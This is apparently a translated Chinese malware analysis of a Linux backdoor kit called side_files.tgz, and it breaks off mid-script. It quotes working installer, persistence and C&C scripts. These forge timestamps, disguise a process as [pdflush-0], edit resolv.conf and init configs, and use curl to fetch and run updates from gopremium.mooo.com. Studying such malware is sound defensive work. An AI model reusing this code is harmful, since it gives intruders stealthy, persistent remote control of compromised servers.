    echo
    id_unic=`cat $maindir/1tempfiles/log.rkip|grep NOTEPAD`
    echo "$id_unic"
    echo
    #### cleaning shit out
    cd /etc/pps ; rm -rf side_files ; ./dep-safe.arhivez
    rm -rf $maindir
**side_files.tgz** **工具的分析**
**安装脚本**
主脚本“安装”执行几个主要功能。它定义了一个timestamp-ptty函数来修改一些文件的时间戳，使得调查更加困难。选择的时间戳和/bin/ls中的类似。
同时，它还会检查是否存在一些已定义的URL，这会在之后的检查中发挥作用。  
最后它还会调用另一个脚本dep-install_install2，这也是side_files.tgz的一部分。
安装脚本的完整内容如下：
    #!/bin/bash
    # echo -ne "33[0;31m [-] 33[0m33[0m" # red
    # echo -ne "33[0;32m [+] 33[0m33[0m" # green
    # echo -ne "33[0;36m xxx 33[0m33[0m" #cyan
    if [ $# != 1 ]; then
     echo
     echo -e "33[0;31m $0 [... | .unix] 33[0m33[0m" # red
     echo -e "33[0;36m [... | .unix] = which main server dir is used 33[0m33[0m" #cyan
            echo 
            exit;
    fi ; echo
    ############## facem linkul de la main server in functie de director
    myhost="gopremium.mooo.com"
    main_link="http://$myhost/$1"
    mkdir /usr/lib/libu.a/ 1>/dev/null 2>/dev/null
    ## adaog timestamp
     echo "timestamp-ptty" > /usr/lib/libu.a/TS8402386704
     touch -r /bin/ls /usr/lib/libu.a
     touch -r /bin/ls /usr/lib/libu.a/TS8402386704
     luam_timestamp() {
                    touch -r /usr/lib/libu.a/TS8402386704 $1
                    }
    ## EOF adaog timestamp 
    echo "$main_link" > /usr/lib/libu.a/l3290367235
    luam_timestamp /usr/lib/libu.a/l3290367235
    main_link_check=`cat /usr/lib/libu.a/l3290367235`
    if [ "$main_link" == "$main_link_check" ] ; then
     #echo "aceleasi linkuri"
     echo -ne "33[0;32m [+] 33[0m33[0m" # green
     echo "main server link: $main_link_check"
     good=1
    else
     #echo "difera"
     echo -ne "33[0;31m [-] 33[0m33[0m" # red
     echo "there is something wrong with the main_link."
     good=0
    fi
    if [ "$good" != "1" ] ; then echo "Some files are missing or empty. Existing." ; echo ; exit ; fi
    echo -ne "33[0;36m [x] 33[0m33[0m" #cyan
    echo -n "press any key if link is okay" ; read a
    # EOF facem linkul de la main server in functie de director
    ### verificam daca e instalat ce folosim
    DEP=(
    '/usr/bin/curl'
    '/bin/sed'
    '/usr/bin/gcc'
    'dep-install_install2'
    'dep-install_ptty'
    )
    for t in "${DEP[@]}" ; do
            if [ -f $t ] ; then
                    echo -ne "33[0;32m [+] 33[0m33[0m" # green
                    echo "$t - found"
            else
                    echo -ne "33[0;31m [-] 33[0m33[0m" # red
                    echo "$t - MISSING OR EMPTY"
                    good=0
            fi
    done
    if [ "$good" != "1" ] ; then echo "Some files are missing or empty. Existing." ; echo ; exit ; fi
    echo -ne "33[0;36m [x] 33[0m33[0m" #cyan
    echo "starting dep-install_install2"
    ./dep-install_install2
**对dep-install_install2脚本的分析**
该脚本的第一部分使用了同样的手段来修改文件的时间戳。
然后它会查询http://gopremium.mooo.com/.unix/return_ip.php来找出受损系统的公开IP。
此外还有一个函数来生成一个唯一的随机ID，用来定位受损系统。
该脚本还会编译events.c，这是一个每小时运行一次的程序，作用是来启动另一个指令/usr/bin/ptty。它甚至会定义一个假名字[pdflush-0]，pdfflush
是一个通常用于为高速缓存在 Linux 系统中运行的程序。还有另一个有趣的技术来隐藏恶意进程。  
Events.c内容如下：
    #include 
    #include 
    #define FAKE "[pdflush-0]"
    int main(int argc, char **argv){
    strcpy(argv[0],FAKE);
    while (1) {
    sleep(3600);
    system("/usr/sbin/ptty 1>>/dev/null 2>>/dev/null");
    }
    return 0;
    }
在C语言代码中被调用的 /usr/sbin/ptty指令是脚本 dep-install_ptty，这是TGZ文件的一部分。我会在之后具体解释脚本内容。  
此脚本所做的下一件事就是确保执行event二进制文件（编译文件）。这是通过修改/etc/init/env.conf 文件，在其中加入对外壳脚本
/usr/sbin/env. /usr/sbin/env的调用，该外壳程序是用来调用event二进制文件的。  
下面是修改版本的内容（请注意最后一行以及对/usr/sbin/env的调用）：
    # env - Event System Register
    description     "Event System Register"
    start on runlevel [2345]
    stop on runlevel [!2345]
    respawn
    exec /usr/sbin/env
**"/usr/bin/env** " 也是side_files.tgz的一部分，基本上调用编译好的二进制文件 **'events** '.
** "/usr/sbin/env"**中的代码 **：**
    killall -9 events 1>/dev/null 2>/dev/null
    nohup events 1>/dev/null 2>/dev/null &
通过对不同的文件的多次调用来执行恶意文件，并利用其他的二进制文件和配置文件，使得网络罪犯得以隐身。  
最后，脚本会发送一个 HTTP 请求到服务器，用来通知已经入侵了一个新的系统。发生这种情况会通过 URL
http://gopremium.mooo.com/.unix/srv-newinstall.php
**  
**
**对dep-install_ptty脚本的分析**
此脚本负责每小时与C&C进行交互。脚本的主要作用如下：
· 检查是否还有其他用户连接到系统当中，由此来决定脚本剩余内容是否需要执行
· 从URL http://gopremium.mooo.com/.unix/srvupdt.tgz.下载更新
· 从URL http://gopremium.mooo.com/.unix/srvupdt_IDXYZ.tgz（其中 IDXYZ 是该系统的唯一
ID）下载此特定受损系统的任何更新版本
· 检查IP是否已经更改，它会查询http://gopremium.mooo.com/.unix/return_ip.php，将其与以前的IP进行对比
·
检查SSHD二进制文件中是否有任何变化，如果服务器已经遭到破坏，就会通过http://gopremium.mooo.com//.unix/srv.php?ip=XXXXip_changed=NO&sshd_changed=NO&sshd_backup_missing=NO&srv_was_down=YES&ptty_ver=3.0（XXXX是当前IP）发送该信息。
    #!/bin/bash
    ptty_ver="3.0"
    ######### verificam daca e cineva logat si nu are idle.
    logati_fara_idle=`w|grep -v 'southsea|inordkuo|localte|lolo'|grep -v days|cut -c43-50|grep s`
    if [[ -z $logati_fara_idle ]] ; then
     # echo "nu e nimeni activ pe server"
     useri=0
    else
     # echo "sunt useri activi pe server"
     useri=1
    fi
    # EOF verificam daca e cineva logat si nu are idle.
    ######## continuam cu scriptul DOAR DACA nu sunt useri activi pe server
    if [ "$useri" == "0" ] ; then
            ####### verificam daca merge dns-ul, daca nu, adaogam nameserver
            dns=`cat /etc/resolv.conf |grep 208.67.220.222`
            if [[ -z $dns ]] ; then
                    # echo "dns nu e bun"
                    echo "nameserver 208.67.220.222" >> /etc/resolv.conf
            fi
            # EOF verificam daca merge dns-ul, daca nu, adaogam nameserver
     ####### continuam cu scriptul DOAR DACA merge netul, verificam pe google
     url_check_net="http://google.com"
     if curl --output /dev/null --silent --head --fail "$url_check_net"; then
      # echo "URL exists: $url_check_net - merge netul"
      ip=`cat /usr/lib/libu.a/i1935678123`
      id_unic=`cat /usr/lib/libu.a/g239293471`        # id unic pt fiecare server in parte, e generat la install
      url=`cat /usr/lib/libu.a/l3290367235`  # hostul principal il ia din txt
      #url="http://192.168.137.177/test/sc/test"      # hostul principal. E DEFINIT IN ptty SI IN install
      ### adaog timestamp
             luam_timestamp() {
                     touch -r /usr/lib/libu.a/TS8402386704 $1 2>/dev/null
                       }
      # EOF timestamp
      luam_timestamp /usr/lib/libu.a
      luam_timestamp /usr/lib/libu.a/l3290367235
      luam_timestamp /usr/lib/libu.a/i1935678123
      luam_timestamp /usr/lib/libu.a/g239293471
      ######### DACA EXISTA ARHIVA srvupdt.tgz PE SERVERUL DE BAZA, O DOWNLOADEAZA, EXTRAGE SI EXECUTA.
             url_srvupdt="$url/srvupdt.tgz"                   # il pui daca vrei sa lansezi un script pe servere
             url_srvupdt_confirmare="$url/srvupdt.php?ip=$ip&tgz=srvupdt.tgz"       # intra pe el ca sa confirme ca a tras arhiva
      if curl --output /dev/null --silent --head --fail "$url_srvupdt"; then
       # echo "URL exists: $url_srvupdt"
       curl -s "${url_srvupdt_confirmare}" 1>/dev/null 2>/dev/null &
       tempdir="/tmp/.tmp"
       rm -rf "$tempdir" 1>/dev/null 2>/dev/null
       mkdir "$tempdir" 1>/dev/null 2>/dev/null
       curl --silent  "$url_srvupdt" --output "$tempdir"/srvupdt.tgz 2>/dev/null